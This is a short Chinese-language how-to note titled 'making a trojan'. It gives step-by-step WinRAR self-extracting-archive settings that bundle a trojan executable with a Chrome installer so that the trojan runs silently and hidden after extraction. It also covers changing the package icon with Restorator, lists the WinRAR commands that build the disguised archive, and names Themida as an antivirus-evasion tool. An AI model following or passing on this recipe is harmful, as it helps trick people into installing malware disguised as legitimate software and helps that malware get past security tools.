# 制作木马

## 打包木马和Chrome打包
1.选中Chrome安装包和 木马.exe
2.右击添加到winrar
3.General - ✔️Create SFX archive
4.Advanced - SFX options
4.1 General - C:\Users\Public
4.2 Setup - Run after extraction: C:\Users\Public\yiye1010.exe
4.3 Setup - Run before extraction: C:\Users\Public\ChromeSetup.exe
4.4 Modes - Hide all
4.5 Update - Extract and update files
5. Restorator修改图标
```bash
WinRAR a -sfx -iicond:\app.ico setup.exe

winrar a -v360 1 -sfx  # 360k分卷
WinRAR a -sfxWinCon.SFX Gift.rar
```
# 免杀工具
1.Themida
